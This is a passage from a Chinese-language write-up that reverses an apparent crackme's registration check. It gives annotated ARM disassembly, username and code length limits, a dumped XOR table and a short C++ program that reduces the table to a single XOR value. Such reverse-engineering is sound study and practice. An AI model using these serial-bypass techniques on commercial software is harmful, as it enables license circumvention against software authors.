LOAD:00038C7C AND             R2, R2, R3 ; R2 = sec[i] &amp;amp; (0x80 / 2)
LOAD:00038C80 LDR             R3, [R11,#var_10] ; R3 = 0x07
LOAD:00038C84 SUB             R3, R3, #1 ; R3 = 0x07 - 1
LOAD:00038C88 MOV             R3, R2,ASR R3 ; R3 = (sec[i] &amp;amp; (0x80 / 2)) / (0x07 - 1)
LOAD:00038C8C STRB            R3, [R11,#var_5] ; var_5存储计算后的结果
LOAD:00038C90 LDRB            R2, [R11,#var_6] ; R2 = (sec[i] &amp;amp; 0x80) / 0x07
LOAD:00038C94 LDRB            R3, [R11,#var_5] ; R3 = (sec[i] &amp;amp; (0x80 / 2)) / (0x07 - 1)
LOAD:00038C98 EOR             R3, R2, R3 ; 上面两个进行异或，存储到R3
LOAD:00038C9C STRB            R3, [R11,#var_6] ; 异或结果存储到var_6
LOAD:00038CA0 ; 28:       v8 &amp;lt;&amp;lt;= v5;
LOAD:00038CA0 LDRB            R2, [R11,#var_6] ; R2 = 异或结果
LOAD:00038CA4 LDR             R3, [R11,#var_10] ; R3 = 0x07
LOAD:00038CA8 MOV             R3, R2,LSL R3 ; R3 = 异或结果 &amp;lt;&amp;lt; 0x07
LOAD:00038CAC STRB            R3, [R11,#var_6] ; var_6 = 异或结果 &amp;lt;&amp;lt; 0x07
LOAD:00038CB0 ; 29:       v7 |= v8;
LOAD:00038CB0 LDRB            R2, [R11,#var_7] ; R2 = sec[i]
LOAD:00038CB4 LDRB            R3, [R11,#var_6] ; R3 = 异或结果 &amp;lt;&amp;lt; 0x07
LOAD:00038CB8 ORR             R3, R2, R3 ; R3 = sec[i] | (异或结果 &amp;lt;&amp;lt; 0x07)
LOAD:00038CBC STRB            R3, [R11,#var_7] ; var_7 = sec[i] | (异或结果 &amp;lt;&amp;lt; 0x07)
LOAD:00038CC0 ; 30:       v4 /= 2;
LOAD:00038CC0 LDR             R3, [R11,#var_14] ; R3 = 0x80
LOAD:00038CC4 MOV             R2, R3,LSR#31 ; R2 = 0
LOAD:00038CC8 ADD             R3, R2, R3 ; R3 = 0x80
LOAD:00038CCC MOV             R3, R3,ASR#1 ; R3 = 0x80 / 2
LOAD:00038CD0 STR             R3, [R11,#var_14] ; var_14 = 0x80 / 2 //这里应该是这个变量循环除2
LOAD:00038CD4 ; 31:       --v5;
LOAD:00038CD4 LDR             R3, [R11,#var_10] ; 0x07-- //这里也是这个变量循环自减一结果作为下次循环的值
LOAD:00038CD8 SUB             R3, R3, #1
LOAD:00038CDC STR             R3, [R11,#var_10]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;直接在最后面下个断点跑完这个函数，可以看到返回值是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80FF1E18&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D966598681C23575C2DF39702233DC05.png&quot; alt=&quot;14.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这是整个大循环&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B1D0E4343F1F751F0E474D8224AC6132.png&quot; alt=&quot;15.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;回到上一层函数，这个值应该是固定的，暂时没有看到有其它参数对这个计算过程造成了影响&lt;/p&gt;

&lt;p&gt;一边分析一边写的，估计有些地方会分析错&lt;/p&gt;

&lt;p&gt;这个函数整个大循环是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xF0&lt;/code&gt;次，也就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;240&lt;/code&gt;次，我们来验证一下&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PolyXorKey&lt;/code&gt;函数是否每次都是生成一样的数据&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0xFFFCBF78
0x60FF7ED8
0xFFFCFFF8
0x60FFFED8
0xFFFCFFF8
0x60FFFED8
0xFFFCFFF8
0x60FFFED8
0xFFFCFFF8
..........
0xFFFCFFF8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;开始变成两个常数的交替出现，难道是动态调试出问题了&lt;/p&gt;

&lt;p&gt;先放一边好了&lt;/p&gt;

&lt;p&gt;这里非常绕，跟了好几次都没有找到关键的地方，后来半猜半想，根据调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;operator new[]()&lt;/code&gt;的函数往回找，找到了和前几题一样的函数，虽然这里算法不一样，但是对于用户名和注册码的存储还是一样的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D082E9F4D6609D960699AB8B2D298A56.png&quot; alt=&quot;16.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下来是校验的地方，单步走一遍先，找到关键的地方，可以看到这里调用了四个函数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F2384491B4C045081BA4B379975EF797.png&quot; alt=&quot;17.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是在静态时这位置我是手动找的，这个费劲，有的函数没有识别出来，红色的。。。。。。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/20B52228AF91A264ABC5C79811896269.png&quot; alt=&quot;18.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其实还有非常多的函数未识别出来，不过并不是很重要&lt;/p&gt;

&lt;p&gt;由于前面没有完整的跟过来，所以这里的一些偏移需要根据动态调试确定指向的数据是什么&lt;/p&gt;

&lt;p&gt;那么&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x34&lt;/code&gt;偏移指向的就是用户名&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F2B6BC6CC15BC4304C407341A1B6B73A.png&quot; alt=&quot;19.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;并且有长度的限制，用户名长度应该在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[8, 24]&lt;/code&gt;之间&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005E66 MOVS            R0, R3  ; s
LOAD:00005E68 BLX             strlen  ; 获取用户名长度
LOAD:00005E6C MOVS            R6, R0  ; R6 = R0 = 用户名长度
LOAD:00005E6E SUBS            R6, #8  ; R6 = strlen(UserName) - 8
LOAD:00005E70 MOVS            R0, R5  ; s
LOAD:00005E72 BLX             strlen  ; 获取注册码长度
LOAD:00005E76 CMP             R6, #0x16 ; 对比strlen(UserName) - 8和0x16
LOAD:00005E78 BHI             loc_5E80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;偏移&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x38&lt;/code&gt;指向的是注册码，注册码长度需要在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[12, 100]&lt;/code&gt;之间&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005E7A SUBS            R0, #0xC
LOAD:00005E7C CMP             R0, #0x58 ; 'X' ; 对比strlen(RegCode) - 0xC和0x58
LOAD:00005E7E BLS             loc_5E94
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二个函数比较长&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/12CCEFC73C98AFAD3E4A3445EBF5B9B6.png&quot; alt=&quot;20.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;获取用户名&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005D48 PUSH            {LR}
LOAD:00005D4A SUB             SP, SP, #0x2C
LOAD:00005D4C STR             R0, [SP,#0x30+var_20] ; 结构体基址
LOAD:00005D4E LDR             R0, [R0,#0x34] ; 获取用户名
LOAD:00005D50 BLX             strlen  ; R0 = 用户名长度
LOAD:00005D54 CMP             R0, #7  ; 用户名长度与7进行对比
LOAD:00005D56 BGT             loc_5D6E ; 用户名长度需要大于7 ---&amp;gt; strlen(UserMame) &amp;gt;= 8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;存储一下中间变量&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005D84 loc_5D84
LOAD:00005D84 LDR             R3, =(dword_16AF8 - 0x5D8A)
LOAD:00005D86 ADD             R3, PC ; dword_16AF8
LOAD:00005D88 ADDS            R3, #0x30 ; '0' ; env
LOAD:00005D8A STR             R3, [SP,#0x30+env] ; 将env变量存储到栈中
LOAD:00005D8C STR             R3, [SP,#0x30+var_C] ; var_C = env
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;进入一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08 * 0x100&lt;/code&gt;次的循环，循环获取用户名的前八位数据&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005D9E loc_5D9E                ;
LOAD:00005D9E LDR             R1, [SP,#0x30+var_20] ; R1为结构体基址
LOAD:00005DA0 LDR             R2, [SP,#0x30+var_28] ; R2 = 0
LOAD:00005DA2 LDR             R3, [R1,#0x34] ; R3 = pUserName
LOAD:00005DA4 LDRB            R3, [R3,R2] ; 循环取用户名的字节数据
LOAD:00005DA6 STR             R3, [SP,#0x30+var_2C] ; 获取的数据暂存栈中
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取一个关键偏移&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005DA8 loc_5DA8                ;
LOAD:00005DA8 MOVS            R3, #0  ; R3 = 0
LOAD:00005DAA STR             R3, [SP,#0x30+var_24] ; var_24 = 0
LOAD:00005DAC LDR             R3, =(dword_16AF8 - 0x5DB4)
LOAD:00005DAE LDR             R1, =0x104B2 ; R1 = 0x104B2
LOAD:00005DB0 ADD             R3, PC ; dword_16AF8 ; 定位结构体基址
LOAD:00005DB2 ADDS            R3, #0x30 ; '0' ; env
LOAD:00005DB4 STR             R3, [SP,#0x30+var_14] ; var_14 = env
LOAD:00005DB6 STR             R1, [SP,#0x30+var_10] ; var_10 = 0x104B2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个偏移在这里的作用是重定位一个Table，通过和用户名相同的偏移来进行数据获取，然后两者异或&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005DC8 loc_5DC8                ;
LOAD:00005DC8 LDR             R3, [SP,#0x30+var_10] ; R3 = 0x104B2
LOAD:00005DCA LDR             R2, [SP,#0x30+var_24] ; R2 = i
LOAD:00005DCC LDR             R1, [SP,#0x30+var_2C] ; R1 = UserName[i]
LOAD:00005DCE ADD             R3, PC  ; 动调 : R3 = 0xA33E8284
LOAD:00005DD0 ADDS            R3, #0x38 ; '8'
LOAD:00005DD2 LDRB            R3, [R2,R3] ; 同一偏移取某地址字节数据
LOAD:00005DD4 EORS            R3, R1  ; 两个地址同偏移数据异或
LOAD:00005DD6 LSLS            R3, R3, #0x18 ; 这两句效果等效&amp;amp;0xFF
LOAD:00005DD8 LSRS            R3, R3, #0x18
LOAD:00005DDA STR             R3, [SP,#0x30+var_2C]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;大概就是&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var_2C = ((byte) UserName[i] ^ (byte) Table[i]) &amp;amp; 0xFF
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后进行次数的判断&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005DDC loc_5DDC                ;
LOAD:00005DDC LDR             R2, [SP,#0x30+var_24] ; var_24 = i
LOAD:00005DDE MOVS            R3, #0x100 ; R3 = 0x100
LOAD:00005DE2 ADDS            R2, #1  ; i++
LOAD:00005DE4 STR             R2, [SP,#0x30+var_24]
LOAD:00005DE6 CMP             R2, R3  ; i &amp;lt; 0x100 //循环0x100次
LOAD:00005DE8 BNE             loc_5DB8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;每个字节一共是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x100&lt;/code&gt;次，动态调试把整个表dump出来&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1A B7 00 3A 19 B7 00 2A  20 00 9D E5 C7 97 00 AA
C6 97 00 BA 91 03 03 E0  C8 3D 00 1A C7 3D 00 0A
48 60 9D E5 03 C2 00 CA  02 C2 00 DA 3C 40 8D E5
B4 3F 00 2A B3 3F 00 3A  E7 76 27 E2 F0 31 00 6A
EF 31 00 7A DA 2C 4C E2  AE A2 00 1A AD A2 00 0A
0A 6B 86 E2 04 C1 00 4A  03 C1 00 5A B4 20 9D E5
B2 18 00 AA B1 18 00 BA  06 30 8A E0 83 0C 00 0A
82 0C 00 1A 0A 80 88 E0  FA BE 00 3A F9 BE 00 2A
0C 10 21 E0 4A 9D 00 0A  49 9D 00 1A 21 5A 8F E2
DE 5E 85 E2 00 50 95 E5  63 84 00 AA 62 84 00 BA
D8 70 9D E5 E6 09 00 CA  E5 09 00 DA 91 02 02 E0
88 6B 00 6A 87 6B 00 7A  02 20 86 E0 DE 10 00 2A
DD 10 00 3A 87 3C 83 E2  31 C2 00 9A 30 C2 00 8A
9C B0 9D E5 EE A4 00 9A  ED A4 00 8A DD 06 00 1A
8C 8A 00 3A 8B 8A 00 2A  71 25 82 E2 F0 0C 00 6A
EF 0C 00 7A FA 19 21 E2  65 AF 00 6A 64 AF 00 7A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;补充一点，这个表其实不是动态生成的，静态分析时就可以dump出来&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D26D0D44367408B05050FFC1C1647D66.png&quot; alt=&quot;21.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因为异或的计算比较有意思，整个表循环异或一遍其实可以等效于异或一个值，这个值我们可以通过计算来确定，输入为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00&lt;/code&gt;，看输出是什么即可&lt;/p&gt;

&lt;p&gt;在IDA里将这个表保存为文件，使用WinHex打开，拷贝存为C Source&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned AnsiChar data[256] = {
	0x1A, 0xB7, 0x00, 0x3A, 0x19, 0xB7, 0x00, 0x2A, 0x20, 0x00, 0x9D, 0xE5, 0xC7, 0x97, 0x00, 0xAA, 
	0xC6, 0x97, 0x00, 0xBA, 0x91, 0x03, 0x03, 0xE0, 0xC8, 0x3D, 0x00, 0x1A, 0xC7, 0x3D, 0x00, 0x0A, 
	0x48, 0x60, 0x9D, 0xE5, 0x03, 0xC2, 0x00, 0xCA, 0x02, 0xC2, 0x00, 0xDA, 0x3C, 0x40, 0x8D, 0xE5, 
	0xB4, 0x3F, 0x00, 0x2A, 0xB3, 0x3F, 0x00, 0x3A, 0xE7, 0x76, 0x27, 0xE2, 0xF0, 0x31, 0x00, 0x6A, 
	0xEF, 0x31, 0x00, 0x7A, 0xDA, 0x2C, 0x4C, 0xE2, 0xAE, 0xA2, 0x00, 0x1A, 0xAD, 0xA2, 0x00, 0x0A, 
	0x0A, 0x6B, 0x86, 0xE2, 0x04, 0xC1, 0x00, 0x4A, 0x03, 0xC1, 0x00, 0x5A, 0xB4, 0x20, 0x9D, 0xE5, 
	0xB2, 0x18, 0x00, 0xAA, 0xB1, 0x18, 0x00, 0xBA, 0x06, 0x30, 0x8A, 0xE0, 0x83, 0x0C, 0x00, 0x0A, 
	0x82, 0x0C, 0x00, 0x1A, 0x0A, 0x80, 0x88, 0xE0, 0xFA, 0xBE, 0x00, 0x3A, 0xF9, 0xBE, 0x00, 0x2A, 
	0x0C, 0x10, 0x21, 0xE0, 0x4A, 0x9D, 0x00, 0x0A, 0x49, 0x9D, 0x00, 0x1A, 0x21, 0x5A, 0x8F, 0xE2, 
	0xDE, 0x5E, 0x85, 0xE2, 0x00, 0x50, 0x95, 0xE5, 0x63, 0x84, 0x00, 0xAA, 0x62, 0x84, 0x00, 0xBA, 
	0xD8, 0x70, 0x9D, 0xE5, 0xE6, 0x09, 0x00, 0xCA, 0xE5, 0x09, 0x00, 0xDA, 0x91, 0x02, 0x02, 0xE0, 
	0x88, 0x6B, 0x00, 0x6A, 0x87, 0x6B, 0x00, 0x7A, 0x02, 0x20, 0x86, 0xE0, 0xDE, 0x10, 0x00, 0x2A, 
	0xDD, 0x10, 0x00, 0x3A, 0x87, 0x3C, 0x83, 0xE2, 0x31, 0xC2, 0x00, 0x9A, 0x30, 0xC2, 0x00, 0x8A, 
	0x9C, 0xB0, 0x9D, 0xE5, 0xEE, 0xA4, 0x00, 0x9A, 0xED, 0xA4, 0x00, 0x8A, 0xDD, 0x06, 0x00, 0x1A, 
	0x8C, 0x8A, 0x00, 0x3A, 0x8B, 0x8A, 0x00, 0x2A, 0x71, 0x25, 0x82, 0xE2, 0xF0, 0x0C, 0x00, 0x6A, 
	0xEF, 0x0C, 0x00, 0x7A, 0xFA, 0x19, 0x21, 0xE2, 0x65, 0xAF, 0x00, 0x6A, 0x64, 0xAF, 0x00, 0x7A
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;写个程序跑一下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstdio&amp;gt;
#include &amp;lt;cstring&amp;gt;

using namespace std;

unsigned char xor_table[256] = {
	0x1A, 0xB7, 0x00, 0x3A, 0x19, 0xB7, 0x00, 0x2A, 0x20, 0x00, 0x9D, 0xE5, 0xC7, 0x97, 0x00, 0xAA,
	0xC6, 0x97, 0x00, 0xBA, 0x91, 0x03, 0x03, 0xE0, 0xC8, 0x3D, 0x00, 0x1A, 0xC7, 0x3D, 0x00, 0x0A,
	0x48, 0x60, 0x9D, 0xE5, 0x03, 0xC2, 0x00, 0xCA, 0x02, 0xC2, 0x00, 0xDA, 0x3C, 0x40, 0x8D, 0xE5,
	0xB4, 0x3F, 0x00, 0x2A, 0xB3, 0x3F, 0x00, 0x3A, 0xE7, 0x76, 0x27, 0xE2, 0xF0, 0x31, 0x00, 0x6A,
	0xEF, 0x31, 0x00, 0x7A, 0xDA, 0x2C, 0x4C, 0xE2, 0xAE, 0xA2, 0x00, 0x1A, 0xAD, 0xA2, 0x00, 0x0A,
	0x0A, 0x6B, 0x86, 0xE2, 0x04, 0xC1, 0x00, 0x4A, 0x03, 0xC1, 0x00, 0x5A, 0xB4, 0x20, 0x9D, 0xE5,
	0xB2, 0x18, 0x00, 0xAA, 0xB1, 0x18, 0x00, 0xBA, 0x06, 0x30, 0x8A, 0xE0, 0x83, 0x0C, 0x00, 0x0A,
	0x82, 0x0C, 0x00, 0x1A, 0x0A, 0x80, 0x88, 0xE0, 0xFA, 0xBE, 0x00, 0x3A, 0xF9, 0xBE, 0x00, 0x2A,
	0x0C, 0x10, 0x21, 0xE0, 0x4A, 0x9D, 0x00, 0x0A, 0x49, 0x9D, 0x00, 0x1A, 0x21, 0x5A, 0x8F, 0xE2,
	0xDE, 0x5E, 0x85, 0xE2, 0x00, 0x50, 0x95, 0xE5, 0x63, 0x84, 0x00, 0xAA, 0x62, 0x84, 0x00, 0xBA,
	0xD8, 0x70, 0x9D, 0xE5, 0xE6, 0x09, 0x00, 0xCA, 0xE5, 0x09, 0x00, 0xDA, 0x91, 0x02, 0x02, 0xE0,
	0x88, 0x6B, 0x00, 0x6A, 0x87, 0x6B, 0x00, 0x7A, 0x02, 0x20, 0x86, 0xE0, 0xDE, 0x10, 0x00, 0x2A,
	0xDD, 0x10, 0x00, 0x3A, 0x87, 0x3C, 0x83, 0xE2, 0x31, 0xC2, 0x00, 0x9A, 0x30, 0xC2, 0x00, 0x8A,
	0x9C, 0xB0, 0x9D, 0xE5, 0xEE, 0xA4, 0x00, 0x9A, 0xED, 0xA4, 0x00, 0x8A, 0xDD, 0x06, 0x00, 0x1A,
	0x8C, 0x8A, 0x00, 0x3A, 0x8B, 0x8A, 0x00, 0x2A, 0x71, 0x25, 0x82, 0xE2, 0xF0, 0x0C, 0x00, 0x6A,
	0xEF, 0x0C, 0x00, 0x7A, 0xFA, 0x19, 0x21, 0xE2, 0x65, 0xAF, 0x00, 0x6A, 0x64, 0xAF, 0x00, 0x7A
};

int main()
{
	unsigned char test =0x00;
	for (int i = 0; i &amp;lt; 256; i++)
	{
		test ^= xor_table[i];
	}
	printf(&quot;0x%x\n&quot;, test);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到整个异或表的异或效果和单独异或&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x93&lt;/code&gt;的效果是一样的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/05D23A9EF243BC42F029D7D2D6453CC7.png&quot; alt=&quot;22.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;计算完后会判断计算后的数据是否为0&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005DFE loc_5DFE                ;
LOAD:00005DFE LDR             R1, [SP,#0x30+var_1C] ; R1 = 异或后的数据
LOAD:00005E00 CMP             R1, #0  ; 判断异或后的数据是否为0
LOAD:00005E02 BNE             loc_5E1E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果是0，则会改为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x99&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005E04 LDR             R0, =(dword_16AF8 - 0x5E0A)
LOAD:00005E06 ADD             R0, PC ; dword_16AF8
LOAD:00005E08 ADDS            R0, #0x30 ; '0' ; env
LOAD:00005E0A BLX             setjmp_0
LOAD:00005E0E MOVS            R2, #0x99 ; '
LOAD:00005E10 STR             R2, [SP,#0x30+var_2C] ; 如果计算后的数据为0，则改为0x99
LOAD:00005E12 CMP             R0, #0
LOAD:00005E14 BEQ             loc_5E1E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;每个字节计算完成存储到栈中，一共八次&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:00005E1E loc_5E1E                ;
LOAD:00005E1E LDR             R2, [SP,#0x30+var_28] ; R2 = i
LOAD:00005E20 LDR             R1, [SP,#0x30+var_20] ; R1 = 结构体基址
LOAD:00005E22 ADDS            R3, R1, R2
LOAD:00005E24 LDR             R2, [SP,#0x30+var_28]
LOAD:00005E26 MOV             R1, SP
LOAD:00005E28 LDRB            R1, [R1,#0x30+var_2C]
LOAD:00005E2A ADDS            R3, #0x5A ; 'Z' ; 0x5A为计算后数据存储偏移
LOAD:00005E2C ADDS            R2, #1
LOAD:00005E2E STRB            R1, [R3] ; 将计算后的值存储到栈中
LOAD:00005E30 STR             R2, [SP,#0x30+var_28]
LOAD:00005E32 CMP             R2, #8  ; 计算8字节，那么取的就是用户名前8位
LOAD:00005E34 BNE             loc_5D8E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最终我们可以看到生成的8字节数据&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F67FDA39F1DCE4EE13C67E33E44ED964.png&quot; alt=&quot;23.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在上图的位置下个断点，数据区跟随&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R3&lt;/code&gt;，可以看到完整的生成过程&lt;/p&gt;

&lt;p&gt;第三个函数，就一个小循环，应该比较简单&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/889FCF8F529600C21E23D3863CD08B1D.png&quot; alt=&quot;24.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;后来分析下来是我错了，它不简单，参数之类的预处理&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000060A0 PUSH            {R4-R6,LR}
LOAD:000060A2 LDR             R3, =(off_15E9C - 0x60AC)
LOAD:000060A4 SUB             SP, SP, #0x18
LOAD:000060A6 STR             R0, [SP,#0x28+var_24] ; var_24 = 结构体基址
LOAD:000060A8 ADD             R3, PC ; off_15E9C
LOAD:000060AA LDR             R3, [R3] ; __stack_chk_guard
LOAD:000060AC ADD             R0, SP, #0x28+s ; s
LOAD:000060AE MOVS            R1, #0  ; R1 = 0
LOAD:000060B0 LDR             R3, [R3]
LOAD:000060B2 MOVS            R2, #0xA ; R2 = 0x0A
LOAD:000060B4 STR             R3, [SP,#0x28+var_14] ; 栈保护
LOAD:000060B6 BLX             memset  ; memset(s, 0, 0x0A)
LOAD:000060BA LDR             R0, =(dword_16AF8 - 0x60C0)
LOAD:000060BC ADD             R0, PC ; dword_16AF8
LOAD:000060BE ADDS            R0, #0x30 ; '0' ; env
LOAD:000060C0 BLX             setjmp_0
LOAD:000060C4 SUBS            R4, R0, #0 ; R4 = 0 //影响了标志位，这里用于判断函数的执行
LOAD:000060C6 BEQ             loc_60CE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;调用了一个函数，这个函数可复杂了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000060CE loc_60CE                ;
LOAD:000060CE LDR             R0, [SP,#0x28+var_24] ; R0 = 结构体基址
LOAD:000060D0 ADDS            R0, #0x5A ; 'Z' ; 取出计算后的8字节数据
LOAD:000060D2 BL              sub_57D4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;参数是计算后的8字节数据，里面有五个函数的调用，继续一个个跟&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/850A6D1E53CAED79A11F4F495067F5AF.png&quot; alt=&quot;25.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;开始做参数的存储，重定位了一个Table&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LOAD:000057D4 PUSH            {R0-R2,R4-R7,LR}
LOAD:000057D6 LDR             R4, =(dword_165F8 - 0x57E0)
LOAD:000057D8 MOVS            R1, R0  ; R1 = R0 = 计算后的8字节数据
LOAD:000057DA MOVS            R2, #0x40 ; '@' ; R2 = 0x40
LOAD:000057DC ADD             R4, PC ; dword_165F8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个Table在动态调试的过程中是有值的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/21057AE145D06E84F11B1982080539F2.png&quot; alt=&quot;26.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是在静态分析的时候是空的，这里有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x30&lt;/code&gt;的偏移&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D8E4092BC4661D650501B274AC4DFDBC.png&quot; alt=&quot;27.png&quot; /&gt;&lt;/p&gt;

